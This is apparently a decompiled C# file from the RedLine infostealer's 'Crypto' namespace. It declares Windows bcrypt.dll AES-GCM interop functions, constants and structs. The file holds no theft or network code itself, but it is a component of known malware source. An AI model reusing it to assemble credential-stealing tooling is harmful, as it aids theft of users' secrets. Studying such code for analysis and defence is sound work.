using System;
using System.Runtime.InteropServices;

namespace RedLine.Client.Logic.Crypto
{
	// Token: 0x02000046 RID: 70
	public static class BCrypt
	{
		// Token: 0x060001B3 RID: 435
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

		// Token: 0x060001B4 RID: 436
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

		// Token: 0x060001B5 RID: 437
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

		// Token: 0x060001B6 RID: 438
		[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
		internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

		// Token: 0x060001B7 RID: 439
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

		// Token: 0x060001B8 RID: 440
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptDestroyKey(IntPtr hKey);

		// Token: 0x060001B9 RID: 441
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptEncrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, uint dwFlags);

		// Token: 0x060001BA RID: 442
		[DllImport("bcrypt.dll")]
		internal static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

		// Token: 0x040000ED RID: 237
		public const uint ERROR_SUCCESS = 0U;

		// Token: 0x040000EE RID: 238
		public const uint BCRYPT_PAD_PSS = 8U;

		// Token: 0x040000EF RID: 239
		public const uint BCRYPT_PAD_OAEP = 4U;

		// Token: 0x040000F0 RID: 240
		public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(1296188491);

		// Token: 0x040000F1 RID: 241
		public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";

		// Token: 0x040000F2 RID: 242
		public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";

		// Token: 0x040000F3 RID: 243
		public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

		// Token: 0x040000F4 RID: 244
		public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";

		// Token: 0x040000F5 RID: 245
		public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";

		// Token: 0x040000F6 RID: 246
		public static readonly string BCRYPT_AES_ALGORITHM = "AES";

		// Token: 0x040000F7 RID: 247
		public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

		// Token: 0x040000F8 RID: 248
		public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 1;

		// Token: 0x040000F9 RID: 249
		public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

		// Token: 0x040000FA RID: 250
		public static readonly uint STATUS_AUTH_TAG_MISMATCH = 3221266434U;

		// Token: 0x02000047 RID: 71
		public struct BCRYPT_PSS_PADDING_INFO
		{
			// Token: 0x060001BC RID: 444 RVA: 0x000068EC File Offset: 0x00004AEC
			public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
			{
				this.pszAlgId = pszAlgId;
				this.cbSalt = cbSalt;
			}

			// Token: 0x040000FB RID: 251
			[MarshalAs(UnmanagedType.LPWStr)]
			public string pszAlgId;

			// Token: 0x040000FC RID: 252
			public int cbSalt;
		}

		// Token: 0x02000048 RID: 72
		public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
		{
			// Token: 0x060001BD RID: 445 RVA: 0x000068FC File Offset: 0x00004AFC
			public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
			{
				this = default(BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
				this.dwInfoVersion = BCrypt.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
				this.cbSize = Marshal.SizeOf(typeof(BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
				if (iv != null)
				{
					this.cbNonce = iv.Length;
					this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
					Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
				}
				if (aad != null)
				{
					this.cbAuthData = aad.Length;
					this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
					Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
				}
				if (tag != null)
				{
					this.cbTag = tag.Length;
					this.pbTag = Marshal.AllocHGlobal(this.cbTag);
					Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
					this.cbMacContext = tag.Length;
					this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
				}
			}

			// Token: 0x060001BE RID: 446 RVA: 0x000069DC File Offset: 0x00004BDC
			public void Dispose()
			{
				if (this.pbNonce != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbNonce);
				}
				if (this.pbTag != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbTag);
				}
				if (this.pbAuthData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbAuthData);
				}
				if (this.pbMacContext != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbMacContext);
				}
			}

			// Token: 0x040000FD RID: 253
			public int cbSize;

			// Token: 0x040000FE RID: 254
			public int dwInfoVersion;

			// Token: 0x040000FF RID: 255
			public IntPtr pbNonce;

			// Token: 0x04000100 RID: 256
			public int cbNonce;

			// Token: 0x04000101 RID: 257
			public IntPtr pbAuthData;

			// Token: 0x04000102 RID: 258
			public int cbAuthData;

			// Token: 0x04000103 RID: 259
			public IntPtr pbTag;

			// Token: 0x04000104 RID: 260
			public int cbTag;

			// Token: 0x04000105 RID: 261
			public IntPtr pbMacContext;

			// Token: 0x04000106 RID: 262
			public int cbMacContext;

			// Token: 0x04000107 RID: 263
			public int cbAAD;

			// Token: 0x04000108 RID: 264
			public long cbData;

			// Token: 0x04000109 RID: 265
			public int dwFlags;
		}

		// Token: 0x02000049 RID: 73
		public struct BCRYPT_KEY_LENGTHS_STRUCT
		{
			// Token: 0x0400010A RID: 266
			public int dwMinLength;

			// Token: 0x0400010B RID: 267
			public int dwMaxLength;

			// Token: 0x0400010C RID: 268
			public int dwIncrement;
		}

		// Token: 0x0200004A RID: 74
		public struct BCRYPT_OAEP_PADDING_INFO
		{
			// Token: 0x060001BF RID: 447 RVA: 0x00006A5D File Offset: 0x00004C5D
			public BCRYPT_OAEP_PADDING_INFO(string alg)
			{
				this.pszAlgId = alg;
				this.pbLabel = IntPtr.Zero;
				this.cbLabel = 0;
			}

			// Token: 0x0400010D RID: 269
			[MarshalAs(UnmanagedType.LPWStr)]
			public string pszAlgId;

			// Token: 0x0400010E RID: 270
			public IntPtr pbLabel;

			// Token: 0x0400010F RID: 271
			public int cbLabel;
		}
	}
}
